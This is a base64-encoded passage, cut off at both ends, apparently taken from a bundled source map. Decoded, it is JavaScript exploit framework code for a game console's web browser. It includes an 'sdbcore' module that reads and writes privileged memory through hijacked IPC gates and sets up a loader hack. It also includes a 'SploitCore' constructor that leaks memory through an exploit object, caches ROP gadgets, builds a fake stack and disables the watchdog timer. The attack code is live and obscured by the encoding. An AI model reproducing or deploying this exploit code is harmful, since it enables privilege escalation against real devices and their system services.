nJlYWQ0KGFkZHIpLCB0aGlzLnJlYWQ0KHV0aWxzLmFkZDIoYWRkciwgNCkpXTtcclxufTtcclxuXHJcbnNkYmNvcmUucHJvdG90eXBlLnJlYWQ0ID0gZnVuY3Rpb24oYWRkcikge1xyXG5cdHZhciBpZDIgPSBuZXcgVWludDMyQXJyYXkoMjQpO1xyXG5cdGlkMlszXSA9IHRoaXMucGRtTmV4dFswXTtcclxuXHRpZDJbNF0gPSB0aGlzLnBkbU5leHRbMV07XHJcblx0aWQyWzVdID0gdGhpcy5wZG1FbnRyeVswXTtcclxuXHRpZDJbNl0gPSB0aGlzLnBkbUVudHJ5WzFdO1xyXG5cdGlkMls5XSA9IGFkZHJbMF07XHJcblx0aWQyWzEwXSA9IGFkZHJbMV07XHJcblx0aWQyWzEzXSA9IHRoaXMuaXBjR2F0MTNyWzBdO1xyXG5cdGlkMlsxNF0gPSB0aGlzLmlwY0dhdDEzclsxXTtcclxuXHRpZDJbMTVdID0gdGhpcy5pcGNHYXQxWzBdO1xyXG5cdGlkMlsxNl0gPSB0aGlzLmlwY0dhdDFbMV07XHJcblx0aWQyWzE3XSA9IHRoaXMuaXBjR2F0OVswXTtcclxuXHRpZDJbMThdID0gdGhpcy5pcGNHYXQ5WzFdO1xyXG5cdGlkMlsxOV0gPSB0aGlzLmlwY0dhdDJbMF07XHJcblx0aWQyWzIwXSA9IHRoaXMuaXBjR2F0MlsxXTtcclxuXHJcblx0dmFyIGlwYyA9IHNjLmlwY01zZygxKTtcclxuXHRpcGMuZGF0YXUzMi5hcHBseShpcGMsIGlkMik7XHJcblx0cmV0dXJuIGlwYy5zZW5kVG8oJ3BsOnUnKS5jbWRJZDtcclxufTtcclxuXHJcbnNkYmNvcmUucHJvdG90eXBlLnJlYWQyID0gZnVuY3Rpb24oYWRkcikge1xyXG5cdHRocm93ICdzZGJjb3JlLnJlYWQyIG5vdCBpbXBsZW1lbnRlZCc7XHJcbn07XHJcblxyXG5zZGJjb3JlLnByb3RvdHlwZS5yZWFkMSA9IGZ1bmN0aW9uKGFkZHIpIHtcclxuXHR0aHJvdyAnc2RiY29yZS5yZWFkMSBub3QgaW1wbGVtZW50ZWQnO1xyXG59O1xyXG5cclxuc2RiY29yZS5wcm90b3R5cGUud3JpdGU4ID0gZnVuY3Rpb24odmFsLCBhZGRyKSB7XHJcblx0dmFyIGlkID0gbmV3IFVpbnQzMkFycmF5KDI0KTtcclxuXHRpZFszXSA9IGFkZHJbMF07XHJcblx0aWRbNF0gPSBhZGRyWzFdO1xyXG5cdGlkWzVdID0gdGhpcy5wZG1FbnRyeVswXTtcclxuXHRpZFs2XSA9IHRoaXMucGRtRW50cnlbMV07XHJcblx0aWRbOV0gPSB2YWxbMF07XHJcblx0aWRbMTBdID0gdmFsWzFdO1xyXG5cdGlkWzEzXSA9IHRoaXMuaXBjR2F0MTN3WzBdO1xyXG5cdGlkWzE0XSA9IHRoaXMuaXBjR2F0MTN3WzFdO1xyXG5cdGlkWzE1XSA9IHRoaXMuaXBjR2F0MVswXTtcclxuXHRpZFsxNl0gPSB0aGlzLmlwY0dhdDFbMV07XHJcblx0aWRbMTddID0gdGhpcy5pcGNHYXQ5WzBdO1xyXG5cdGlkWzE4XSA9IHRoaXMuaXBjR2F0OVsxXTtcclxuXHRpZFsxOV0gPSB0aGlzLmlwY0dhdDJbMF07XHJcblx0aWRbMjBdID0gdGhpcy5pcGNHYXQyWzFdO1xyXG5cclxuXHR2YXIgaXBjID0gc2MuaXBjTXNnKDEpO1xyXG5cdGlwYy5kYXRhdTMyLmFwcGx5KGlwYywgaWQpO1xyXG5cdGlwYy5zZW5kVG8oJ3BsOnUnKTtcclxufTtcclxuXHJcbnNkYmNvcmUucHJvdG90eXBlLndyaXRlODIgPSBmdW5jdGlvbih2YWwsIGFkZHIpIHtcclxuXHR2YXIgaWQgPSBuZXcgVWludDMyQXJyYXkoMjQpO1xyXG5cdGlkWzNdID0gYWRkclswXTtcclxuXHRpZFs0XSA9IGFkZHJbMV07XHJcblx0aWRbNV0gPSB0aGlzLnBkbUVudHJ5WzBdO1xyXG5cdGlkWzZdID0gdGhpcy5wZG1FbnRyeVsxXTtcclxuXHRpZFs5XSA9IHZhbFswXTtcclxuXHRpZFsxMF0gPSB2YWxbMV07XHJcblx0aWRbMTNdID0gdGhpcy5pcGNHYXQxM3dbMF07XHJcblx0aWRbMTRdID0gdGhpcy5pcGNHYXQxM3dbMV07XHJcblx0aWRbMTVdID0gdGhpcy5pcGNHYXQxWzBdO1xyXG5cdGlkWzE2XSA9IHRoaXMuaXBjR2F0MVsxXTtcclxuXHRpZFsxN10gPSB0aGlzLmlwY0dhdDlbMF07XHJcblx0aWRbMThdID0gdGhpcy5pcGNHYXQ5WzFdO1xyXG5cdGlkWzE5XSA9IHRoaXMuaXBjR2F0MlswXTtcclxuXHRpZFsyMF0gPSB0aGlzLmlwY0dhdDJbMV07XHJcblxyXG5cdHZhciBpcGMgPSBzYy5pcGNNc2coMSk7XHJcblx0aXBjLmRhdGF1MzIuYXBwbHkoaXBjLCBpZCk7XHJcblx0aXBjLnNlbmRUbygncGw6dScpO1xyXG59O1xyXG5cclxuc2RiY29yZS5wcm90b3R5cGUud3JpdGU0ID0gZnVuY3Rpb24odmFsLCBhZGRyKSB7XHJcblx0dGhyb3cgJ3NkYmNvcmUud3JpdGU0IG5vdCBpbXBsZW1lbnRlZCc7XHJcbn07XHJcblxyXG5zZGJjb3JlLnByb3RvdHlwZS53cml0ZTIgPSBmdW5jdGlvbih2YWwsIGFkZHIpIHtcclxuXHR0aHJvdyAnc2RiY29yZS53cml0ZTIgbm90IGltcGxlbWVudGVkJztcclxufTtcclxuXHJcbnNkYmNvcmUucHJvdG90eXBlLndyaXRlMSA9IGZ1bmN0aW9uKHZhbCwgYWRkcikge1xyXG5cdHRocm93ICdzZGJjb3JlLndyaXRlMSBub3QgaW1wbGVtZW50ZWQnO1xyXG59O1xyXG5cclxuc2RiY29yZS5wcm90b3R5cGUubWVtY3B5RnJvbUJyb3dzZXIgPSBmdW5jdGlvbihkc3QsIHNyYywgc2l6ZSkge1xyXG5cdGZvcih2YXIgaSA9IDA7IGkgPCBzaXplOyBpICs9IDgpIHtcclxuXHRcdHZhciBzID0gdXRpbHMuYWRkMihzcmMsIGkpO1xyXG5cdFx0Ly91dGlscy5sb2coJ1tCcm9dIFJlYWRpbmcgJyArIGkpO1xyXG5cdFx0dmFyIHYgPSBbc3JjW2kgPj4+IDJdLCBzcmNbKGkgPj4+IDIpICsgMV1dO1xyXG5cdFx0Ly91dGlscy5sb2coJ1tTREJdIFdyaXRpbmcgJyArIHV0aWxzLnBhZGRyKHYpICsgJyB0byAnICsgaSk7XHJcblx0XHR0aGlzLndyaXRlODIodiwgdXRpbHMuYWRkMihkc3QsIGkpKTtcclxuXHR9XHJcbn07XHJcblxyXG5zZGJjb3JlLnByb3RvdHlwZS5tZW1jcHlUb0Jyb3dzZXIgPSBmdW5jdGlvbihkc3QsIHNyYywgc2l6ZSkge1xyXG5cdHZhciBzdWIgPSBbXTtcclxuXHRmb3IodmFyIGkgPSAwOyBpIDwgc2l6ZTsgaSArPSA0KSB7XHJcblx0XHQvL3V0aWxzLmxvZygnW1NEQl0gUmVhZGluZyAnICsgaSk7XHJcblx0XHR2YXIgdiA9IHRoaXMucmVhZDQodXRpbHMuYWRkMihzcmMsIGkpKTtcclxuXHRcdC8vdXRpbHMubG9nKCdbQnJvXSBXcml0aW5nICcgKyB2LnRvU3RyaW5nKDE2KSArICcgdG8gJyArIGkpO1xyXG5cdFx0ZHN0W2kgPj4gMl0gPSB2O1xyXG5cdH1cclxufTtcclxuXHJcbnNkYmNvcmUucHJvdG90eXBlLm1hbGxvYyA9IGZ1bmN0aW9uKHNpemUpIHtcclxuXHQvL3JldHVybiB0aGlzLnNsb3dDYWxsKHRoaXMub2Zmc2V0c1snbWFsbG9jJ10sIFswLCBzaXplXSk7XHJcbn07XHJcblxyXG5zZGJjb3JlLnByb3RvdHlwZS5mcmVlID0gZnVuY3Rpb24oYWRkcikge1xyXG5cdC8vdGhpcy5zbG93Q2FsbCh0aGlzLm9mZnNldHNbJ2ZyZWUnXSwgWzAsIGFkZHJdKTtcclxufTtcclxuXHJcbnNkYmNvcmUucHJvdG90eXBlLnNldHVwX3JvX2hheCA9IGZ1bmN0aW9uKCkge1xyXG5cdHZhciBzZGJJcGNCdWYgPSB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MTUwMDAwKTtcclxuXHRcclxuXHR2YXIgc2RiID0gdGhpcztcclxuXHR2YXIgc2MgPSB0aGlzLnNjO1xyXG5cclxuXHRmdW5jdGlvbiB3YWl0SGFuZGxlcyhoYW5kbGVzKSB7XHJcblx0XHRmb3IodmFyIGkgPSAwOyBpIDwgaGFuZGxlcy5sZW5ndGg7ICsraSlcclxuXHRcdFx0c2RiLndyaXRlOChbaGFuZGxlc1tpXSwgMF0sIHV0aWxzLmFkZDIoc2RiSXBjQnVmLCA0ICsgaSAqIDQpKTtcclxuXHRcdHZhciByZXQgPSBzZGIuc3ZjKDB4MTgsIFtzZGJJcGNCdWYsIHV0aWxzLmFkZDIoc2RiSXBjQnVmLCA0KSwgaGFuZGxlcy5sZW5ndGgsIDBdKVswXTtcclxuXHRcdHZhciBobmRJID0gc2RiLnJlYWQ0KHNkYklwY0J1Zik7XHJcblx0XHRyZXR1cm4gW3JldCwgaG5kSV07XHJcblx0fVxyXG5cclxuXHRmdW5jdGlvbiBhY2NlcHRTZXNzaW9uKGhhbmRsZSkge1xyXG5cdFx0c2RiLnN2YygweDQxLCBbc2RiSXBjQnVmLCBoYW5kbGVdKTtcclxuXHRcdHJldHVybiBzZGIucmVhZDQoc2RiSXBjQnVmKTtcclxuXHR9XHJcblxyXG5cdGZ1bmN0aW9uIHJlYWRJbmNvbWluZyhoYW5kbGUpIHtcclxuXHRcdHV0aWxzLmxvZygnV3JpdGluZyBoYW5kbGUnKTtcclxuXHRcdHNkYi53cml0ZTgoW2hhbmRsZSwgMF0sIHNkYi5zY3JhdGNoKTtcclxuXHRcdHV0aWxzLmxvZygncmVwbHlhbmRyZWNlaXZlJyk7XHJcblx0XHR2YXIgcmV0ID0gc2RiLnN2YygweDQ0LCBbc2RiLnNjcmF0Y2gsIHNkYklwY0J1ZiwgMHgxMDAwLCBzZGIuc2NyYXRjaCwgMSwgWzAsIDBdLCBbMHhmZmZmZmZmZiwgMHhmZmZmZmZmZl1dKVswXTtcclxuXHRcdHV0aWxzLmxvZygnQ29weWluZyBkYXRhJyk7XHJcblx0XHRpZihyZXQgPT0gMHhmNjAxKVxyXG5cdFx0XHRyZXR1cm4gbnVsbDtcclxuXHRcdHZhciBkYXRhID0gbmV3IFVpbnQzMkFycmF5KDB4MTAwKTtcclxuXHRcdHNkYi5tZW1jcHlUb0Jyb3dzZXIoZGF0YSwgc2RiSXBjQnVmLCA3IDw8IDIpO1xyXG5cdFx0dXRpbHMubG9nKCdEb25lPycpO1xyXG5cdFx0cmV0dXJuIGRhdGE7XHJcblx0fVxyXG5cclxuXHRmdW5jdGlvbiByZXNwb25kKGhhbmRsZSwgZGF0YSkge1xyXG5cdFx0dXRpbHMubG9nKCdBdHRlbXB0aW5nIHRvIHJlc3BvbmQnKTtcclxuXHRcdHNkYi5tZW1jcHlGcm9tQnJvd3NlcihzZGJJcGNCdWYsIGRhdGEsIGRhdGEubGVuZ3RoIDw8IDIpO1xyXG5cdFx0dXRpbHMubG9nKCdyZXBseWFuZHJlY2VpdmUnKTtcclxuXHRcdHV0aWxzLmxvZyh1dGlscy5wYWRkcihzZGIuc3ZjKDB4NDQsIFtzZGIuc2NyYXRjaCwgc2RiSXBjQnVmLCAweDEwMDAsIHNkYi5zY3JhdGNoLCAwLCBoYW5kbGUsIFswLCAwXV0pKSk7XHJcblx0XHR1dGlscy5sb2coJ0RvbmU/Jyk7XHJcblx0fVxyXG5cclxuXHR0aGlzLnNjLnVucmVnaXN0ZXJTZXJ2aWNlKCdzcGw6Jyk7XHJcblxyXG5cdHV0aWxzLmxvZygnT3BlbmluZyBTTSBoYW5kbGUnKTtcclxuXHR1dGlscy5sb2codXRpbHMucGFkZHIoc2RiLnN2YygweDFGLCBbc2RiSXBjQnVmLCB1dGlscy5hZGQyKHNkYi5zZGJfYmFzZSwgMHg3MTgwNyldKSkpO1xyXG5cdHZhciBzZGJTbUhhbmRsZSA9IHNkYi5yZWFkNChzZGJJcGNCdWYpO1xyXG5cdHV0aWxzLmxvZygnU00gaGFuZGxlOiAnICsgc2RiU21IYW5kbGUudG9TdHJpbmcoMTYpKTtcclxuXHJcblx0dmFyIGRhdGEgPSBuZXcgVWludDMyQXJyYXkoWzB4NCwgMHhjLCAwLCAwLCAweDQ5NDM0NjUzLCAwLCAyLCAwLCAweDNhNmM3MDczLCAwLCAyMDAsIDB4MjBdKTtcclxuXHRzZGIubWVtY3B5RnJvbUJyb3dzZXIoc2RiSXBjQnVmLCBkYXRhLCBkYXRhLmxlbmd0aCA8PCAyKTtcclxuXHR1dGlscy5sb2codXRpbHMucGFkZHIoc2RiLnN2YygweDIyLCBbc2RiSXBjQnVmLCAweDEwMDAsIHNkYlNtSGFuZGxlXSkpKTtcclxuXHR2YXIgb3V0cHV0ID0gbmV3IFVpbnQzMkFycmF5KDB4MTAwID4+IDIpO1xyXG5cdHNkYi5tZW1jcHlUb0Jyb3dzZXIob3V0cHV0LCBzZGJJcGNCdWYsIDQgPDwgMik7XHJcblx0XHJcblx0Zm9yKHZhciBpID0gMDsgaSA8IDQ7ICsraSlcclxuXHRcdHV0aWxzLmxvZyhvdXRwdXRbaV0udG9TdHJpbmcoMTYpKTtcclxuXHJcblx0dmFyIHBvcnRIYW5kbGUgPSBvdXRwdXRbM107XHJcblx0dXRpbHMubG9nKCdQb3J0IGhhbmRsZTogJyArIHBvcnRIYW5kbGUudG9TdHJpbmcoMTYpKTtcclxuXHR2YXIgaGFuZGxlcyA9IFtwb3J0SGFuZGxlXTtcclxuXHRcclxuXHR3YWl0SGFuZGxlcyhoYW5kbGVzKTtcclxuXHJcblx0dmFyIGxnZXRTZXJ2aWNlUGlkID0gZnVuY3Rpb24oc2VydmljZSkge1xyXG5cdFx0dGhpcy5zYy5raWxsQXV0b0hhbmRsZSgpO1xyXG5cdFx0dmFyIHJlcyA9IHRoaXMuc2MuaXBjTXNnKDIpLnNldFR5cGUoMykuZGF0YXU2NCgwKS5zZW5kVG8oc2VydmljZSkuc2hvdygpO1xyXG5cdFx0dGhpcy5zYy5zdmNDbG9zZUhhbmRsZShyZXMubW92ZWRIYW5kbGVzWzBdKTtcclxuXHRcdHJldHVybiByZXMucGlkWzBdO1xyXG5cdH07XHJcblxyXG5cdHZhciBzZXJ2aWNlID0gJ2xkcjpybyc7XHJcblx0dmFyIHBpZCA9IGxnZXRTZXJ2aWNlUGlkKHNlcnZpY2UpO1xyXG5cdHV0aWxzLmxvZyhzZXJ2aWNlICsgJyBpcyBQSUQgMHgnK3BpZC50b1N0cmluZygxNikpO1xyXG5cclxuXHR0aGlzLnNjLmlwY01zZygxKS5kYXRhKHBpZCkuc2VuZFRvKCdwbTpzaGVsbCcpLnNob3coKTtcclxuXHJcblx0dmFyIHRpZCA9IHV0aWxzLnBhcnNlQWRkcignMDEwMDAwMDAwMDAwMDAzNycpO1xyXG5cclxuXHR2YXIgbmV3UGlkID0gdGhpcy5zYy5pcGNNc2coMCkuZGF0YXU2NCgwLCB0aWQsIDMpLnNlbmRUbygncG06c2hlbGwnKS5zaG93KCkuZGF0YVsxXVswXTtcclxuXHJcblx0dmFyIGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7XHJcblx0XHR2YXIgdGVtcCA9IHdhaXRIYW5kbGVzKGhhbmRsZXMpO1xyXG5cdFx0c3dpdGNoKHRlbXBbMF0pIHtcclxuXHRcdGNhc2UgMDpcclxuXHRcdFx0dXRpbHMubG9nKCdIYW5kbGUgJyArIHRlbXBbMV0gKyAnIHJlYWR5Jyk7XHJcblx0XHRcdHZhciBoYW5kbGUgPSBoYW5kbGVzW3RlbXBbMV1dO1xyXG5cdFx0XHRpZihoYW5kbGUgPT0gcG9ydEhhbmRsZSkge1xyXG5cdFx0XHRcdHZhciBwaXBlID0gYWNjZXB0U2Vzc2lvbihwb3J0SGFuZGxlKTtcclxuXHRcdFx0XHR1dGlscy5sb2coJ0FjY2VwdGVkIG5ldyBwaXBlICcgKyBwaXBlLnRvU3RyaW5nKDE2KSk7XHJcblx0XHRcdFx0aGFuZGxlcy5wdXNoKHBpcGUpO1xyXG5cdFx0XHR9IGVsc2Uge1xyXG5cdFx0XHRcdHV0aWxzLmxvZygnR290IGluY29taW5nIG1lc3NhZ2Ugb24gJyArIGhhbmRsZS50b1N0cmluZygxNikpO1xyXG5cdFx0XHRcdHZhciBkYXRhID0gcmVhZEluY29taW5nKGhhbmRsZSk7XHJcblx0XHRcdFx0aWYoZGF0YSA9PSBudWxsKSB7XHJcblx0XHRcdFx0XHR1dGlscy5sb2coJ1BpcGUgY2xvc2VkLiAgUmVtb3ZpbmcuJyk7XHJcblx0XHRcdFx0XHRzZGIuc3ZjKDB4MTYsIFtoYW5kbGVdKTtcclxuXHRcdFx0XHRcdGhhbmRsZXMuc3BsaWNlKGhhbmRsZXMuaW5kZXhPZihoYW5kbGUpLCAxKTtcclxuXHRcdFx0XHRcdGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpOyAvLyBXZSBzaG91bGQgYmUgZG9uZSBub3chXHJcblx0XHRcdFx0XHRpZiAoc2RiLm9ucmVhZHkgIT0gbnVsbClcclxuXHRcdFx0XHRcdFx0c2RiLm9ucmVhZHkoKTtcclxuXHRcdFx0XHRcdGJyZWFrO1xyXG5cdFx0XHRcdH1cclxuXHJcblx0XHRcdFx0aWYoZGF0YVs2XSA9PSAxMSkgeyAvLyBHZXREZXZVbml0RmxhZ1xyXG5cdFx0XHRcdFx0cmVzcG9uZChoYW5kbGUsIG5ldyBVaW50MzJBcnJheShbMCwgMHhhLCAwLCAwLCAweDRmNDM0NjUzLCAwLCAwLCAwLCAwLCAwXSkpO1xyXG5cdFx0XHRcdH0gZWxzZSBpZihkYXRhWzZdID09IDApIHtcclxuXHRcdFx0XHRcdHJlc3BvbmQoaGFuZGxlLCBuZXcgVWludDMyQXJyYXkoWzAsIDB4YSwgMCwgMCwgMHg0ZjQzNDY1MywgMCwgMCwgMCwgMSwgMF0pKTtcclxuXHRcdFx0XHR9IGVsc2Uge1xyXG5cdFx0XHRcdFx0Y2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XHJcblx0XHRcdFx0fVxyXG5cdFx0XHR9XHJcblx0XHRcdGJyZWFrO1xyXG5cdFx0Y2FzZSAweGVhMDE6XHJcblx0XHRcdGJyZWFrO1xyXG5cdFx0ZGVmYXVsdDpcclxuXHRcdFx0dXRpbHMubG9nKCdVbmtub3duIHJldCBmb3Igd2FpdDogJyArIHRlbXBbMF0udG9TdHJpbmcoMTYpKTtcclxuXHRcdFx0YnJlYWs7XHJcblx0XHR9XHJcblx0fSwgMTAwKTtcclxufTtcclxuXHJcbm1vZHVsZS5leHBvcnRzID0gc2RiY29yZTtcclxuIiwidmFyIHV0aWxzID0gcmVxdWlyZSgnLi91dGlscycpO1xuXG52YXIgc3Bsb2l0TWl4aW4gPSB7fTtcblxuc3Bsb2l0TWl4aW4uc3Bsb2l0TWl4aW5Jbml0ID0gZnVuY3Rpb24gKCkge1xuXHR0aGlzLmlwY0hhbmRsZXMgPSB7fTtcbn07XG5cbnNwbG9pdE1peGluLndpdGhIYW5kbGUgPSBmdW5jdGlvbiAoaGFuZGxlLCBjYikge1xuXHR0cnkge1xuXHRcdHJldHVybiBjYihoYW5kbGUpO1xuXHR9IGZpbmFsbHkge1xuXHRcdHRoaXMuc3ZjQ2xvc2VIYW5kbGUoaGFuZGxlKTtcblx0fVxufTtcblxuc3Bsb2l0TWl4aW4uZmluZFVubWFwcGVkUmVnaW9uID0gZnVuY3Rpb24gKHRhcmdldFNpemUpIHtcblx0dGFyZ2V0U2l6ZSA9IHV0aWxzLnBhZDY0KHRhcmdldFNpemUpO1xuXG5cdC8vIHNraXAgdGhlIGZpcnN0IGJsb2NrIHNvIG5vYm9keSB0cmllcyB0byBtYXAgYXQgMFxuXHR2YXIgYWRkciA9IFswLCAwXTtcblx0dmFyIFtiYXNlLCBzaXplLCBzdGF0ZSwgcGVybV0gPSB0aGlzLnN2Y1F1ZXJ5TWVtKGFkZHIsIHRydWUpLmFzc2VydE9rKCk7XG5cdGRvIHtcblx0XHRhZGRyID0gdXRpbHMuYWRkMihhZGRyLCBzaXplKTtcblx0XHRbYmFzZSwgc2l6ZSwgc3RhdGUsIHBlcm1dID0gdGhpcy5zdmNRdWVyeU1lbShhZGRyLCB0cnVlKS5hc3NlcnRPaygpO1xuXHRcdGlmIChiYXNlWzBdICE9PSBhZGRyWzBdIHx8IGJhc2VbMV0gIT09IGFkZHJbMV0pIHtcblx0XHRcdHRocm93IG5ldyBFcnJvcigncXVlcnlNZW0gYmFzZSBtaXNtYXRjaD8nKTtcblx0XHR9XG5cdH0gd2hpbGUgKHNpemVbMV0gPCB0YXJnZXRTaXplWzFdIHx8IChzaXplWzFdID09PSB0YXJnZXRTaXplWzFdICYmIHNpemVbMF0gPCB0YXJnZXRTaXplWzBdKSB8fCBwZXJtICE9PSAwIHx8IHN0YXRlICE9PSAwKTtcblx0cmV0dXJuIGFkZHI7XG59O1xuXG5tb2R1bGUuZXhwb3J0cyA9IHNwbG9pdE1peGluO1xuIiwiLyogZXNsaW50IGNhbWVsY2FzZTogXCJvZmZcIiAqL1xuLyogZXNsaW50IG5vLXJlZGVjbGFyZTogXCJvZmZcIiAqL1xuLyogZXNsaW50IG5vLXVubW9kaWZpZWQtbG9vcC1jb25kaXRpb246IFwib2ZmXCIgKi9cbi8qIGVzbGludCBuby1mYWxsdGhyb3VnaDogXCJvZmZcIiAqL1xuLyogZ2xvYmFsIFhNTEh0dHBSZXF1ZXN0ICovXG52YXIgdXRpbHMgPSByZXF1aXJlKCcuL3V0aWxzJyk7XG5cbnZhciBTREJDb3JlID0gcmVxdWlyZSgnLi9zZGJjb3JlJyk7XG52YXIgQXN5bmNDYWxsZXIgPSByZXF1aXJlKCcuL0FzeW5jQ2FsbGVyJyk7XG52YXIgc3ZjTWl4aW4gPSByZXF1aXJlKCcuL3N2YycpO1xudmFyIHNwbG9pdE1peGluID0gcmVxdWlyZSgnLi9zcGxvaXRNaXhpbicpO1xuXG52YXIgSUZpbGUgPSByZXF1aXJlKCcuL2ZzL0lGaWxlJyk7XG52YXIgSUZpbGVTeXN0ZW0gPSByZXF1aXJlKCcuL2ZzL0lGaWxlU3lzdGVtJyk7XG52YXIgSURpcmVjdG9yeSA9IHJlcXVpcmUoJy4vZnMvSURpcmVjdG9yeScpO1xuXG52YXIgY29uZmlnID0gcmVxdWlyZSgnLi4vY29uZmlnJyk7XG5cbi8qKlxuIEEgdmFsdWUgdGhhdCByZXByZXNlbnRzIGEgNjQtYml0IEludGVnZXI8YnI+XG4gVGhpcyBpcyBhbiBhcnJheSBvZiBleGFjdGx5IDIgdmFsdWVzLCBhcyBkZXNjcmliZWQgYmVsb3cuXG5cbiBAdHlwZWRlZiB7QXJyYXkuPG51bWJlcj59IHU2NFxuIEBwcm9wZXJ0eSB7bnVtYmVyfSAwIC0gTG93IHZhbHVlIG9mIHU2NFxuIEBwcm9wZXJ0eSB7bnVtYmVyfSAxIC0gSGlnaCB2YWx1ZSBvZiB1NjRcbiBAZXhhbXBsZVxuIFsgMHgwMDAwMDAwMCwgMHhmZmZmMDAwMCBdXG4gKi9cblxuLyoqXG4gUmVwcmVzZW50cyBhbiBpbnN0YW5jZSBvZiBTcGxvaXRDb3JlXG4gQGNvbnN0cnVjdG9yXG4gQHBhcmFtIHtvYmplY3R9IGV4cGxvaXRNZSAtIFJlZmVyZW5jZSB0byBvYmplY3QgdXNlZCBmb3IgbGVha2luZyBkYXRhXG4gQHByb3BlcnR5IHt1NjR9IGJhc2UgLSBCYXNlIGFkZHJlc3NcbiBAcHJvcGVydHkge2Jvb2xlYW59IGlzQnJvd3NlciAtIFJldHVybnMgdHJ1ZVxuIEBwcm9wZXJ0eSB7c3RyaW5nfSBuYW1lIC0gUmV0dXJucyBcImJyb3dzZXJcIlxuICovXG52YXIgU3Bsb2l0Q29yZSA9IGZ1bmN0aW9uIChleHBsb2l0TWUpIHtcblx0dGhpcy5nYygpO1xuXG5cdHRoaXMudmEgPSBleHBsb2l0TWUudmE7XG5cdHRoaXMudmIgPSBleHBsb2l0TWUudmI7XG5cdHRoaXMubGVha2VlID0gZXhwbG9pdE1lLmxlYWtlZTtcblx0dGhpcy5sZWFrYWRkciA9IGV4cGxvaXRNZS5sZWFrYWRkcjtcblxuXHR0aGlzLmFsbG9jYXRlZCA9IHt9O1xuXG5cdHRoaXMuZnVuYyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkO1xuXHR0aGlzLmZ1bmMuYXBwbHkoZG9jdW1lbnQsIFsnJ10pOyAvLyBFbnN1cmUgdGhlIGZ1bmMgcG9pbnRlciBpcyBjYWNoZWQgYXQgODo5XG5cblx0aWYgKCFTcGxvaXRDb3JlLnByb3RvdHlwZS5pbXBvcnRlZE1peGlucykge1xuXHRcdE9iamVjdC5rZXlzKHN2Y01peGluKS5mb3JFYWNoKChrKSA9PiB7XG5cdFx0XHRTcGxvaXRDb3JlLnByb3RvdHlwZVtrXSA9IHN2Y01peGluW2tdO1xuXHRcdH0pO1xuXG5cdFx0T2JqZWN0LmtleXMoc3Bsb2l0TWl4aW4pLmZvckVhY2goKGspID0+IHtcblx0XHRcdFNwbG9pdENvcmUucHJvdG90eXBlW2tdID0gc3Bsb2l0TWl4aW5ba107XG5cdFx0fSk7XG5cblx0XHRTcGxvaXRDb3JlLnByb3RvdHlwZS5pbXBvcnRlZE1peGlucyA9IHRydWU7XG5cdH1cblxuXHR0aGlzLnNjID0gdGhpcztcblxuXHR0aGlzLmJhc2UgPSB0aGlzLmdldEJhc2UoKTtcblxuXHR0aGlzLm1haW5hZGRyID0gdGhpcy53YWxrTGlzdCgpO1xuXHR1dGlscy5kbG9nKCdNYWluIGFkZHJlc3MgJyArIHV0aWxzLnBhZGRyKHRoaXMubWFpbmFkZHIpKTtcblxuXHQvLyBUaGlzIGlzbid0IGV4YWN0bHkgcmlnaHQsIGJ1dCByZWFsbHkgc2hvdWxkbid0IG1hdHRlci4gIEFzIGxvbmcgYXMgaXQncyA8PSB0aGUgcmVhbCBzaXplLCB3ZSB3b24ndCBjcmFzaC5cblx0dGhpcy5tYWluVGV4dFNpemUgPSAweDVCMjAwMDtcblx0dGhpcy53a2NUZXh0U2l6ZSA9IDB4RjM3MDAwO1xuXG5cdHRoaXMuZ2FkZ2V0Q2FjaGUgPSB0aGlzLmxvYWRDYWNoZSgpO1xuXG5cdHRoaXMuZmFrZV9zdGFjayA9IHRoaXMubWFsbG9jKDB4MTAwMDAwKTtcblxuXHR0aGlzLmlwY0J1ZiA9IG5ldyBVaW50MzJBcnJheSgweDIwMDAgPj4gMik7XG5cdHRoaXMuZW1wdHlJcGNCdWYgPSBuZXcgVWludDMyQXJyYXkoMHgyMDAwID4+IDIpOyAvLyBLZWVwIHRoaXMgZW1wdHkuXG5cdHRoaXMuaXBjQnVmQWRkciA9IHRoaXMuZ2V0QXJyYXlCdWZmZXJBZGRyKHRoaXMuaXBjQnVmKTtcblx0dGhpcy5zcGxvaXRNaXhpbkluaXQoKTtcblx0dGhpcy5pcGNTZXJ2aWNlcyA9IHt9O1xuXG5cdHRoaXMuZ2MoKTtcblx0dXRpbHMubG9nKCdEaXNhYmxpbmcgd2F0Y2hkb2cgdGltZXIuLi4nKTtcblx0dGhpcy5kaXNhYmxlV2F0Y2hkb2coKTtcblxuXHR2YXIgdmVyc2J1ZiA9IG5ldyBBcnJheUJ1ZmZlcigweDEwMCk7XG5cdHRoaXMuaXBjTXNnKDMpLmNEZXNjcmlwdG9yKHZlcnNidWYpLnNlbmRUbyhcInNldDpzeXNcIikuYXNzZXJ0T2soKTtcblx0dGhpcy52ZXJzaW9uID0gdXRpbHMudThhMm51bGxzdHIobmV3IFVpbnQ4QXJyYXkodmVyc2J1ZiwgMHg2OCwgMHgxMDAtMHg2OCkpO1xuXG5cdHZhciBzYyA9IHRoaXM7XG5cblx0aWYgKGNvbmZpZy5zZGJjb3JlKSB7XG5cdFx0dXRpbHMubG9nKCdQd25pbmcgc2RiIG1vZHVsZS4uLicpO1xuXHRcdHRoaXMuc2RiID0gbmV3IFNEQkNvcmUodGhpcywgdGhpcy52ZXJzaW9uKTtcblx0XHRpZighdGhpcy5zZGIuaW5pdGlhbGl6ZWQpIHtcblx0XHRcdHV0aWxzLmxvZygnRmFpbGVkIHRvIGluaXRpYWxpemUgc2RiJyk7XG5cdFx0XHR0aGlzLnNkYiA9IG51bGw7XG5cdFx0fVxuXHR9XG5cblx0c2MuZ2V0U2VydmljZXMoW1wic2V0OnN5c1wiLCBcInNldDpmZFwiXSwgZnVuY3Rpb24gKHNldHN5cywgc2V0ZmQpIHtcblx0XHR2YXIgZ2V0U2V0dGluZyA9IGZ1bmN0aW9uIChzZXNzaW9uLCBjbHMsIG5hbSkgeyAvLyBzZXNzaW9uIGlzIHNldDpzeXNcblx0XHRcdHZhciBvdXQgPSBuZXcgVWludDMyQXJyYXkoMSk7XG5cdFx0XHR2YXIgeDEgPSB1dGlscy5zdHIyYWIoY2xzKTtcblx0XHRcdHZhciB4MiA9IHV0aWxzLnN0cjJhYihuYW